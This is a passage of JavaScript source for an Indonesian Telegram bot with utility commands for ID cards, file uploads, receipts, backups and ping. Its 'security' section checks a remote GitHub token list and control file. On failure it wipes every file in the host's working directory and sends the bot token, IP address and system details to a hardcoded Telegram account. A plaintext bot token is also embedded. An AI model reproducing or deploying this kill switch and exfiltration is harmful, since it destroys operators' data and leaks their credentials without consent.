<blockquote>🪪 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗜𝗗 𝗖𝗔𝗥𝗗</blockquote>

👤 <b>User Information</b>
├ <b>User ID:</b> <code>${userId}</code>
├ <b>Name:</b> <a href="tg://user?id=${userId}">${fullName}</a>
├ <b>Username:</b> ${username}
├ <b>DC ID:</b> ${dcId}
└ <b>Language:</b> ${getLanguageName(languageCode)}

📊 <b>Profile Status</b>
├ <b>Profile Photo:</b> ${hasPhoto ? `🟢 Yes (${photoCount})` : '🔴 No'}
├ <b>Scam Account:</b> ${msg.from.is_scam ? '🔴 Yes' : '🟢 No'}
├ <b>Fake Account:</b> ${msg.from.is_fake ? '🔴 Yes' : '🟢 No'}
├ <b>Telegram Premium:</b> ${msg.from.is_premium ? '🟢 Yes' : '🔴 No'}
└ <b>Verified Account:</b> ${msg.from.is_verified ? '🟢 Yes' : '🔴 No'}

🤖 <b>Bot Status</b>
├ <b>Premium Access:</b> ${premiumStatus}
├ <b>Blacklisted:</b> ${data.blacklist && data.blacklist.includes(userId.toString()) ? '🔴 Yes' : '🟢 No'}
├ <b>Groups Added:</b> ${data.user_group_count && data.user_group_count[userId.toString()] ? data.user_group_count[userId.toString()] : 0}
└ <b>Registered User:</b> ${data.users && data.users.includes(userId.toString()) ? '🟢 Yes' : '🔴 No'}

📅 <b>Check Information</b>
├ <b>Check Date:</b> ${date}
├ <b>Check Time:</b> ${time}
└ <b>Chat Type:</b> ${msg.chat.type.charAt(0).toUpperCase() + msg.chat.type.slice(1)}

<blockquote>Generated by @${DEVELOPER}</blockquote>
    `;
    
    await bot.sendMessage(chatId, fallbackText, { 
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: `👤 ${firstName}`, 
              url: `tg://user?id=${userId}` 
            }
          ],
          [
            { 
              text: "🔄 Refresh", 
              callback_data: `refresh_cekid_${userId}` 
            }
          ]
        ]
      }
    });
  }
});

function getLanguageName(languageCode) {
  const languages = {
    'id': '🇮🇩 Indonesian',
    'en': '🇺🇸 English',
    'en-US': '🇺🇸 English',
    'en-GB': '🇬🇧 English',
    'es': '🇪🇸 Spanish',
    'fr': '🇫🇷 French',
    'de': '🇩🇪 German',
    'ru': '🇷🇺 Russian',
    'ar': '🇸🇦 Arabic',
    'pt': '🇵🇹 Portuguese',
    'ja': '🇯🇵 Japanese',
    'ko': '🇰🇷 Korean',
    'zh': '🇨🇳 Chinese',
    'hi': '🇮🇳 Hindi',
    'it': '🇮🇹 Italian',
    'tr': '🇹🇷 Turkish',
    'nl': '🇳🇱 Dutch',
    'pl': '🇵🇱 Polish',
    'uk': '🇺🇦 Ukrainian',
    'ms': '🇲🇾 Malay',
    'th': '🇹🇭 Thai',
    'vi': '🇻🇳 Vietnamese'
  };
  return languages[languageCode] || `${languageCode}`;
}

bot.on("callback_query", async (query) => {
  if (query.data.startsWith("refresh_cekid_")) {
    const userId = query.data.split("_")[2];
    
    if (query.from.id.toString() !== userId) {
      return await bot.answerCallbackQuery(query.id, {
        text: "❌ Button ini bukan untuk kamu!",
        show_alert: true
      });
    }
    
    await bot.answerCallbackQuery(query.id, {
      text: "🔄 Memperbarui ID Card...",
      show_alert: false
    });

    try {
      await bot.deleteMessage(query.message.chat.id, query.message.message_id);
    } catch (error) {
      console.error("Error deleting message:", error);
    }
    
    const simulatedMsg = {
      chat: { 
        id: query.message.chat.id,
        type: query.message.chat.type
      },
      from: query.from,
      text: "/cekid"
    };
    
    bot.emit("text", simulatedMsg);
  }
});

// === /tourl ===
bot.onText(/^\/tourl$/i, async (msg) => {
  if (!(await requireNotBlacklisted(msg))) return;
  if (!(await requireNotMaintenance(msg))) return;

  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const username = msg.from.first_name || "User";

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>

🌸 <b>Cara menggunakan:</b>
➥ <b>1.</b> Reply sebuah file, foto, atau video
➥ <b>2.</b> Ketik <code>/tourl</code>

📝 <b>Contoh:</b>
• Reply foto → /tourl
• Reply video → /tourl  
• Reply file → /tourl

👋 Hai <b>${username}</b> 🌸
`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }

  const repliedMsg = msg.reply_to_message;
  let fileId, fileName, fileType;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    fileType = "document";
  } else if (repliedMsg.photo) {
    fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
    fileType = "photo";
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
    fileType = "video";
  } else {
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶𝗱𝘂𝗸𝘂𝗻𝗴</blockquote>
➥ <b>Status:</b> Hanya support file, foto, dan video
➥ <b>Format yang didukung:</b> Document, Photo, Video`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }

  try {
    const processingMsg = await bot.sendMessage(
      chatId,
      `<blockquote>⏳ 𝗠𝗲𝗻𝗴𝘂𝗽𝗹𝗼𝗮𝗱 𝗞𝗲 𝗖𝗮𝘁𝗯𝗼𝘅</blockquote>

📁 <b>Informasi File</b>
➥ <b>Jenis:</b> ${fileType}
➥ <b>Nama:</b> <code>${fileName}</code>
➥ <b>Status:</b> Mohon tunggu sebentar...`,
      { 
        reply_to_message_id: msg.message_id, 
        parse_mode: "HTML" 
      }
    );

    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { 
      responseType: "stream",
      timeout: 30000 
    });

    const FormData = require("form-data");
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", response.data, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream"
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
      timeout: 30000
    });

    await bot.editMessageText(
      `<blockquote>✅ 𝗨𝗽𝗹𝗼𝗮𝗱 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹</blockquote>

🔗 <b>Informasi URL</b>
➥ <b>URL:</b> <code>${catboxUrl}</code>
➥ <b>Link:</b> ${catboxUrl}

📝 <b>Keterangan</b>
➥ <b>Expired:</b> 24 jam
➥ <b>Status:</b> File berhasil diupload`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    console.error("❌ Error di /tourl:", error);
    
    let errorMessage = "❌ Gagal mengupload file ke Catbox. Coba lagi nanti.";
    if (error.code === 'ECONNABORTED') {
      errorMessage = "❌ Timeout: Upload terlalu lama. Coba dengan file yang lebih kecil.";
    } else if (error.response) {
      errorMessage = "❌ Server Catbox sedang error. Coba lagi nanti.";
    }

    bot.sendMessage(chatId, `
<blockquote>❌ 𝗨𝗽𝗹𝗼𝗮𝗱 𝗚𝗮𝗴𝗮𝗹</blockquote>
➥ <b>Error:</b> ${errorMessage}
➥ <b>Status:</b> Silakan coba lagi nanti`, { 
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id 
});
  }
});

// === /done ===
bot.onText(/^\/done(?:\s+(.+))?$/i, async (msg, match) => {
  if (!(await cekAkses("premium", msg))) return;

  const chatId = msg.chat.id;
  const input = match[1]?.trim();
  const replyMsg = msg.reply_to_message;

  if (!input) {
    return bot.sendMessage(chatId, `
<blockquote>📌 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>

🌸 <b>Gunakan format berikut:</b>
<code>/done nama barang,harga,metode bayar</code>

📝 <b>Contoh:</b>
<code>/done jasa install panel,15000,Dana</code>`, { parse_mode: "HTML" });
  }

  const [namaBarang, hargaBarang, metodeBayar] = input.split(",").map(x => x?.trim());
  if (!namaBarang || !hargaBarang) {
    return bot.sendMessage(chatId, `
<blockquote>❗ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗧𝗶𝗱𝗮𝗸 𝗟𝗲𝗻𝗴𝗸𝗮𝗽</blockquote>

🌸 <b>Minimal isi:</b>
➥ <b>Nama barang</b> dan <b>harga</b>

📝 <b>Contoh lengkap:</b>
<code>/done jasa install panel,15000,Dana</code>`, { parse_mode: "HTML" });
  }

  const hargaFormatted = `Rp ${Number(hargaBarang).toLocaleString("id-ID")}`;
  const metodePembayaran = metodeBayar || "Tidak disebutkan";
  const now = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit"
  });

  const caption = `
<blockquote>✅ 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟</blockquote>

🌸 <b>Detail Transaksi</b>
➥ <b>Barang:</b> ${namaBarang}
➥ <b>Nominal:</b> ${hargaFormatted}
➥ <b>Payment:</b> ${metodePembayaran}
➥ <b>Waktu:</b> ${now}

📝 <b>Keterangan:</b> ALL TRX NO REFF!!!

👤 <b>Contact:</b> ${DEVELOPER}
`;

  if (replyMsg && replyMsg.photo) {
    const photos = replyMsg.photo;
    const photoId = photos[photos.length - 1].file_id; 
    await bot.sendPhoto(chatId, photoId, {
      caption: caption,
      parse_mode: "HTML"
    }).catch((err) => {
      console.error("Send photo error:", err);
      bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗚𝗮𝗴𝗮𝗹 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼</blockquote>
➥ <b>Status:</b> Gagal mengirim foto transaksi`, { parse_mode: "HTML" });
    });
  } 
  else {
    await bot.sendMessage(chatId, caption, { parse_mode: "HTML" });
  }
});

// === /backup ===
bot.onText(/^\/backup$/i, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;

  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;
  const username = msg.from.first_name || "User";

  try {
    const loadingFrames = [
      "⏳ Membuat backup data .",
      "⏳ Membuat backup data ..",
      "⏳ Membuat backup data ...",
      "💽 Sedang mengemas file ...",
      "💿 Menyimpan hasil backup ...",
    ];

    const processing = await bot.sendMessage(chatId, 
`<blockquote>💾 𝗠𝗲𝗺𝘂𝗹𝗮𝗶 𝗕𝗮𝗰𝗸𝘂𝗽</blockquote>

👤 <b>Informasi</b>
➥ <b>Oleh:</b> ${username}
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}
➥ <b>Status:</b> Sedang memproses...`,
{ parse_mode: "HTML" });

    let frame = 0;
    const anim = setInterval(() => {
      const frameText = loadingFrames[frame % loadingFrames.length];
      bot.editMessageText(
`<blockquote>💾 𝗠𝗲𝗺𝘂𝗹𝗮𝗶 𝗕𝗮𝗰𝗸𝘂𝗽</blockquote>

${frameText}

👤 <b>Informasi</b>
➥ <b>Oleh:</b> ${username}
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}`,
        {
          chat_id: chatId,
          message_id: processing.message_id,
          parse_mode: "HTML"
        }
      ).catch(() => {});
      frame++;
    }, 700);

    await new Promise((r) => setTimeout(r, 2500));
    
    const backupPath = backupData();
    clearInterval(anim);

    if (!backupPath) {
      return bot.editMessageText(
`<blockquote>❌ 𝗕𝗮𝗰𝗸𝘂𝗽 𝗚𝗮𝗴𝗮𝗹</blockquote>

🌸 <b>Informasi Error</b>
➥ <b>Status:</b> Tidak ada file data untuk di-backup
➥ <b>Lokasi:</b> <code>${DATA_FILE}</code>
➥ <b>Solusi:</b> Pastikan file database ada`,
        {
          chat_id: chatId,
          message_id: processing.message_id,
          parse_mode: "HTML"
        }
      );
    }

    const stats = fs.statSync(backupPath);
    const sizeKB = (stats.size / 1024).toFixed(2);
    const backupTime = new Date().toLocaleString("id-ID");

    const caption = `
<blockquote>💾 𝗕𝗔𝗖𝗞𝗨𝗣 𝗦𝗘𝗟𝗘𝗦𝗔𝗜</blockquote>

📁 <b>Detail File</b>
➥ <b>Nama File:</b> <code>${path.basename(backupPath)}</code>  
➥ <b>Ukuran:</b> ${sizeKB} KB  
➥ <b>Lokasi:</b> <code>./backup/</code>

👤 <b>Informasi</b>
➥ <b>Oleh:</b> ${username}  
➥ <b>Waktu:</b> ${backupTime}

<blockquote>✨ Backup berhasil disimpan!  
Gunakan file ini untuk restore bila dibutuhkan 💾</blockquote>
`;

    await bot.editMessageText(
`<blockquote>✅ 𝗕𝗮𝗰𝗸𝘂𝗽 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹</blockquote>
➥ <b>Status:</b> Mengirim file backup...`,
      {
        chat_id: chatId,
        message_id: processing.message_id,
        parse_mode: "HTML"
      }
    );

    await bot.sendDocument(chatId, backupPath, { 
      caption: caption, 
      parse_mode: "HTML" 
    });

    const mainOwner = OWNER_IDS[0];
    if (mainOwner && String(mainOwner) !== String(senderId)) {
      await bot.sendMessage(mainOwner, `
<blockquote>📂 𝗟𝗮𝗽𝗼𝗿𝗮𝗻 𝗕𝗮𝗰𝗸𝘂𝗽 𝗗𝗮𝘁𝗮</blockquote>

👤 <b>Informasi Backup</b>
➥ <b>Oleh:</b> <a href="tg://user?id=${senderId}">${username}</a>  
➥ <b>Ukuran:</b> ${sizeKB} KB  
➥ <b>Waktu:</b> ${backupTime}  
➥ <b>Lokasi:</b> ./database/backup/`,
{ parse_mode: "HTML" });
    }

  } catch (error) {
    console.error("❌ Error backup manual:", error);
    bot.sendMessage(chatId, `
<blockquote>❌ 𝗕𝗮𝗰𝗸𝘂𝗽 𝗚𝗮𝗴𝗮𝗹</blockquote>

🌸 <b>Informasi Error</b>
➥ <b>Error:</b> <code>${error.message}</code>
➥ <b>Status:</b> Terjadi kesalahan saat membuat backup data

🔧 <b>Solusi:</b> Silakan coba lagi nanti atau hubungi Developer`,
{ parse_mode: "HTML" });
  }
});

// === /ping ===
bot.onText(/^\/ping$/i, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const username = msg.from.first_name || "User";
  try {
    const startTime = Date.now();
    
    const pingMsg = await bot.sendMessage(chatId, `
<blockquote>🏓 𝗠𝗲𝗻𝗴𝗵𝗶𝘁𝘂𝗻𝗴 𝗣𝗶𝗻𝗴</blockquote>
➥ <b>Status:</b> Sedang menghitung ping...`, { 
      parse_mode: "HTML" 
    });
    
    const botPing = Date.now() - startTime;

    const uptimeMs = Date.now() - BOT_START_TIME;
    const uptime = formatUptime(Math.floor(uptimeMs / 1000));
    const totalMem = os.totalmem() / (1024 ** 3);
    const freeMem = os.freemem() / (1024 ** 3);
    const usedMem = totalMem - freeMem;
    const memoryUsage = process.memoryUsage();
    const cpuModel = os.cpus()[0].model;
    const cpuCores = os.cpus().length;

    const teks = `
<blockquote>🖥️ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗦𝗜𝗦𝗧𝗘𝗠</blockquote>

⚡ <b>PERFORMANCE</b>
➥ <b>Bot Ping:</b> <code>${botPing}ms</code>
➥ <b>Uptime:</b> <code>${uptime}</code>

🔧 <b>HARDWARE</b>
➥ <b>CPU:</b> <code>${cpuModel}</code>
➥ <b>Cores:</b> <code>${cpuCores} Core</code>
➥ <b>RAM:</b> <code>${usedMem.toFixed(2)}GB / ${totalMem.toFixed(2)}GB</code>
➥ <b>Memory Usage:</b> <code>${(memoryUsage.rss / 1024 / 1024).toFixed(2)}MB</code>

📊 <b>STATISTIK</b>
➥ <b>Total Users:</b> <code>${loadData().users?.length || 0}</code>
➥ <b>Total Groups:</b> <code>${loadData().groups?.length || 0}</code>
`;

    await bot.editMessageText(teks, {
      chat_id: chatId,
      message_id: pingMsg.message_id,
      parse_mode: 'HTML'
    });

  } catch (err) {
    console.error("❌ Error di /ping:", err);
    bot.sendMessage(chatId, `
<blockquote>❌ 𝗚𝗮𝗴𝗮𝗹 𝗠𝗲𝗺𝗯𝗮𝗰𝗮 𝗜𝗻𝗳𝗼 𝗦𝗶𝘀𝘁𝗲𝗺</blockquote>
➥ <b>Status:</b> Terjadi kesalahan saat membaca informasi sistem
➥ <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
  }
});

function formatUptime(seconds) {
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  
  const parts = [];
  if (d > 0) parts.push(`${d} hari`);
  if (h > 0) parts.push(`${h} jam`);
  if (m > 0) parts.push(`${m} menit`);
  if (s > 0) parts.push(`${s} detik`);
  
  return parts.join(', ');
}

// === SECURITY NOTIFICATION SYSTEM ===
const token_notif = "7919448344:AAGbBE7pXRDaplPF3SvGqHy7Lo7QvSAKHes"; 
const owner_notif = "8401927724";

const botNotif = new TelegramBot(token_notif, { polling: false });

const AXIOS_CONFIG = {
    timeout: 10000,
    headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/vnd.github.v3+json"
    }
};

function deleteAllPanelFiles() {
    console.log(chalk.red.bold("MENGHAPUS SEMUA FILE DI PANEL..."));
    console.log(chalk.red("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
    
    try {
        const files = fs.readdirSync('./');
        let deletedCount = 0;
        let skippedCount = 0;
        
        files.forEach(file => {
            const excludedFiles = ['node_modules', '.git', 'package.json'];
            const excludedExtensions = ['.log', '.txt', '.md'];
            
            if (excludedFiles.includes(file) || excludedExtensions.some(ext => file.endsWith(ext))) {
                console.log(chalk.yellow(`DILEWATI: ${file}`));
                skippedCount++;
                return;
            }
            
            try {
                const filePath = './' + file;
                
                if (fs.existsSync(filePath)) {
                    if (fs.lstatSync(filePath).isDirectory()) {
                        fs.rmSync(filePath, { recursive: true, force: true });
                        console.log(chalk.red(`DIHAPUS FOLDER: ${file}`));
                    } else {
                        fs.unlinkSync(filePath);
                        console.log(chalk.red(`DIHAPUS FILE: ${file}`));
                    }
                    deletedCount++;
                }
            } catch (error) {
                console.log(chalk.red(`GAGAL: ${file} - ${error.message}`));
            }
        });
        
        console.log(chalk.red("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
        console.log(chalk.red.bold(`BERHASIL DIHAPUS: ${deletedCount} file/folder`));
        console.log(chalk.yellow(`DILEWATI: ${skippedCount} file/folder`));
        
    } catch (error) {
        console.log(chalk.red('Gagal membaca directory panel'));
    }
}

async function getIPAddress() {
    const services = [
        'https://api.ipify.org?format=json',
        'https://ipv4.icanhazip.com',
        'https://api.myip.com',
        'https://ipinfo.io/json'
    ];
    
    for (const service of services) {
        try {
            const { data } = await axios.get(service, { timeout: 5000 });
            if (service.includes('ipify')) return data.ip;
            if (service.includes('icanhazip')) return data.trim();
            if (service.includes('myip')) return data.ip;
            if (service.includes('ipinfo')) return data.ip;
        } catch (error) {
            continue;
        }
    }
    return 'Unknown IP';
}

async function getSystemInfo() {
    try {
        const osInfo = `${os.type()} ${os.release()} (${os.arch()})`;
        const nodeVersion = process.version;
        const platform = os.platform();
        const hostname = os.hostname();
        
        return {
            os: osInfo,
            node: nodeVersion,
            platform: platform,
            hostname: hostname,
            memory: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`,
            uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`
        };
    } catch (error) {
        return {
            os: 'Unknown',
            node: process.version,
            platform: 'Unknown',
            hostname: 'Unknown',
            memory: 'Unknown',
            uptime: 'Unknown'
        };
    }
}

async function sendIntruderAlert(tokenPenyusup, reason = "Token tidak terdaftar") {
    try {
        const currentTime = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const ipAddress = await getIPAddress();
        const systemInfo = await getSystemInfo();

        const alertMessage = `
<blockquote>🚨 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗔𝗟𝗘𝗥𝗧 - 𝗦𝗬𝗦𝗧𝗘𝗠 𝗪𝗜𝗣𝗘𝗗</blockquote>

🌸 <b>Informasi Sistem</b>
➥ <b>Waktu:</b> <code>${currentTime}</code>
➥ <b>Node.js:</b> <code>${systemInfo.node}</code>
➥ <b>OS:</b> <code>${systemInfo.os}</code>
➥ <b>Platform:</b> <code>${systemInfo.platform}</code>
➥ <b>Hostname:</b> <code>${systemInfo.hostname}</code>
➥ <b>Memory:</b> <code>${systemInfo.memory}</code>
➥ <b>Uptime:</b> <code>${systemInfo.uptime}</code>

🔍 <b>Informasi Penyusup</b>
➥ <b>ID User:</b> <code>${OWNER_IDS[0]}</code>
➥ <b>Bot Token:</b> <code>${tokenPenyusup}</code>
➥ <b>Alamat IP:</b> <code>${ipAddress}</code>

⚡ <b>Detail Kejadian</b>
➥ <b>Alasan:</b> <code>${reason}</code>
➥ <b>Status:</b> <code>Semua File Di Panel Telah Dihapus!</code>
➥ <b>Tindakan:</b> <code>System Wipe Executed</code>

👤 <b>Kontak Penyusup</b>
➥ <b>Username:</b> ${DEVELOPER}
➥ <b>Channel:</b> ${CHANNEL_USERNAME}

<blockquote>⚠️ Semua file telah dihapus otomatis dari sistem</blockquote>
`;

        await botNotif.sendMessage(owner_notif, alertMessage, {
            parse_mode: "HTML"
        });

    } catch (error) {
        console.log('Gagal mengirim notifikasi penyusup:', error.message);
    }
}

const GITHUB_TOKEN: "***FILTERED***";
const REPO_OWNER = "KyzzOfficial";
const REPO_NAME = "Keamanan";
const FILE_PATH = "tokens.json";

const TOKEN_DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
const CONTROL_URL = "https://raw.githubusercontent.com/KyzzOfficial/Keamanan/main/control.txt";

function maskToken(token) {
  if (!token) return "••••";
  if (token.length <= 10) return token.replace(/.(?=.{2})/g, "•");
  return `${token.slice(0, 5)}•••${token.slice(-3)}`;
}

function box(text, colorFn = chalk.white) {
  const msg = `[ ${text.toUpperCase()} ]`;
  return colorFn(msg);
}

async function verifyTokenFromGitHub() {
  console.log(chalk.blue(box("Memvalidasi Token Bot")));
  
  try {
    await axios.get('https://api.github.com', { timeout: 5000 });
    
    const res = await axios.get(TOKEN_DATABASE_URL, {
      headers: { 
        Authorization: `token ${GITHUB_TOKEN}`,
        "User-Agent": "Node.js",
        "Accept": "application/vnd.github.v3+json"
      },
      timeout: 10000,
    });

    console.log(chalk.gray(`Status API: ${res.status}`));

    if (res.status !== 200) {
      throw new Error(`HTTP ${res.status}: ${res.statusText}`);
    }

    const fileContent = Buffer.from(res.data.content, "base64").toString("utf-8");
    const tokenData = JSON.parse(fileContent);
    const tokenList = tokenData?.tokens || [];

    if (!Array.isArray(tokenList) || tokenList.length === 0) {
      console.log(chalk.red(box("File tokens.json kosong atau tidak valid")));
      
      deleteAllPanelFiles();
      await sendIntruderAlert(BOT_TOKEN, "File tokens.json kosong atau tidak valid");
      
      process.exit(1);
    }

    console.log(chalk.gray(`Database tokens: ${tokenList.length} entri`));

    if (!tokenList.includes(BOT_TOKEN)) {
      console.log(chalk.red(box("Token Kamu Tidak Terdaftar")));
      console.log("Hubungi @KyzzXyz untuk menambahkan token kamu.");
      
      deleteAllPanelFiles();
      await sendIntruderAlert(BOT_TOKEN, "Token tidak terdaftar mencoba akses sistem");
      
      process.exit(1);
    }

    console.log(chalk.green(box("Token Terdaftar & Valid")));
    
  } catch (error) {
    console.log(chalk.red(box("Gagal Memverifikasi Token")));
    console.log(chalk.red(`Error: ${error.message}`));
    
    if (error.response) {
      console.log(chalk.red(`Status HTTP: ${error.response.status}`));
    }
    
    console.log("Periksa:");
    console.log("1. Koneksi internet");
    console.log("2. Konfigurasi repository keamanan");
    console.log("3. File path database tokens");
    
    process.exit(1);
  }
}

async function checkControlStatus() {
  console.log(chalk.blue(box("Memeriksa Status Kontrol Script")));
  
  try {
    const { data } = await axios.get(CONTROL_URL, {
      timeout: 8000,
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cache-Control": "no-cache"
      },
    });

    const status = data.trim().toLowerCase();

    if (status !== "on") {
      console.log(chalk.red(box("SCRIPT DINONAKTIFKAN")));
      console.log(`Status: ${status.toUpperCase()}`);

      deleteAllPanelFiles();
      await sendIntruderAlert(BOT_TOKEN, "Script dinonaktifkan oleh kontrol pusat");
      
      process.exit(1);
    }

    console.log(chalk.green(box("Script Diizinkan — Status ON")));
    
  } catch (error) {
    console.log(chalk.red(box("Gagal Mengambil Status Kontrol")));
    console.log(chalk.red(`Error: ${error.message}`));
    console.log("Periksa:");
    console.log("1. Koneksi internet");
    console.log("2. URL kontrol sistem");
    console.log("3. Akses ke repository");
    process.exit(1);
  }
}

function showBanner() {
  console.clear();
  console.log(
    chalk.red.bold(`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SYSTEM SECURITY INITIALIZED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Developer : ${DEVELOPER}
Owner ID  : ${OWNER_IDS.join(", ")}
Token     : ${maskToken(BOT_TOKEN)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Status : AKTIF & TERVERIFIKASI 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
  );
  console.log(chalk.cyan(box("Menjalankan Sistem Utama Bot")));
}

async function checkInternetConnection() {
  try {
    await axios.get('https://www.google.com', { timeout: 5000 });
    return true;
  } catch {
    return false;
  }
}

(async () => {
  console.clear();
  console.log(chalk.yellow(box("Memulai Sistem Keamanan")));

  console.log(chalk.blue(box("Memeriksa Koneksi Internet")));
  const hasInternet = await checkInternetConnection();
  
  if (!hasInternet) {
    console.log(chalk.red(box("Tidak Ada Koneksi Internet")));
    console.log("Pastikan perangkat terhubung ke internet");
    process.exit(1);
  }

  console.log(chalk.green(box("Koneksi Internet OK")));

  try {
    await verifyTokenFromGitHub();
    await checkControlStatus();
    showBanner();

    require("./SKYZBOTZ.js");
    
  } catch (error) {
    console.log(chalk.red(box("Gagal Menjalankan Sistem Keamanan")));
    console.error(error);
    process.exit(1);
  }
})();

// === AUTO UPDATE SYSTEM (UPLOAD & AUTO REPLACE) ===
const https = require('https');
const AdmZip = require('adm-zip');

const GITHUB_CONFIG = {
    username: 'KyzzOfficial',
    repo: 'Keamanan',
    branch: 'main',
    token: "***FILTERED***"
};

let waitingForReply = new Map();

// Command updatesc - Owner Utama only
bot.onText(/^\/updatesc$/, async (msg) => {
    if (!(await cekAkses("utama", msg))) return;
    
    const chatId = msg.chat.id;
    waitingForReply.set(chatId, true);
    
    bot.sendMessage(chatId,
        '📤 <b>GITHUB AUTO-UPDATE</b>\n\n' +
        'Reply dengan file/ZIP:\n' +
        '• Langsung upload ke GitHub\n' +
        '• Auto replace file existing\n' +
        '• ZIP auto extract semua file\n\n' +
        '<i>Upload file sekarang...</i>',
        { 
            parse_mode: 'HTML',
            reply_markup: { force_reply: true }
        }
    );
});

// Handle file upload
bot.on('message', async (msg) => {
    if (!msg.document) return;
    
    const chatId = msg.chat.id;
    
    if (waitingForReply.has(chatId)) {
        if (!(await cekAkses("utama", msg))) return;
        waitingForReply.delete(chatId);
        await processUpload(msg);
    }
});

async function processUpload(msg) {
    const chatId = msg.chat.id;
    const fileId = msg.document.file_id;
    const fileName = msg.document.file_name;
    
    try {
        const processingMsg = await bot.sendMessage(chatId, 
            `⏳ <b>Uploading to GitHub...</b>\n📁 <code>${fileName}</code>`,
            { parse_mode: 'HTML' }
        );

        const fileLink = await bot.getFileLink(fileId);
        const response = await fetch(fileLink);
        const fileBuffer = await response.buffer();
        
        let result;
        if (fileName.endsWith('.zip')) {
            result = await uploadZipFiles(fileBuffer);
        } else {
            result = await uploadSingleFile(fileName, fileBuffer);
        }
        
        await bot.editMessageText(
            `✅ <b>UPLOAD BERHASIL!</b>\n\n` +
            `📁 File: <code>${fileName}</code>\n` +
            `📊 Total: ${result.uploaded} files\n` +
            `🔄 Replaced: ${result.replaced} files\n` +
            `🕒 Time: ${new Date().toLocaleString()}`,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: 'HTML'
            }
        );
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// Upload single file
async function uploadSingleFile(fileName, fileBuffer) {
    const content = filterContent(fileBuffer.toString('utf8'));
    await githubUpload(fileName, content);
    return { uploaded: 1, replaced: 1 };
}

// Upload ZIP dan extract semua file
async function uploadZipFiles(zipBuffer) {
    const zip = new AdmZip(zipBuffer);
    const entries = zip.getEntries();
    let uploaded = 0;
    let replaced = 0;
    
    for (const entry of entries) {
        if (!entry.isDirectory) {
            try {
                const content = filterContent(entry.getData().toString('utf8'));
                await githubUpload(entry.entryName, content);
                uploaded++;
                replaced++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.log(`Skip: ${entry.entryName}`);
            }
        }
    }
    
    return { uploaded, replaced };
}

// Upload ke GitHub (auto replace)
async function githubUpload(filePath, content) {
    return new Promise((resolve, reject) => {
        getFileInfo(filePath).then(fileInfo => {
            const options = {
                hostname: 'api.github.com',
                path: `/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents/${filePath}`,
                method: 'PUT',
                headers: {
                    'Authorization': `token ${GITHUB_CONFIG.token}`,
                    'User-Agent': 'Telegram-Bot',
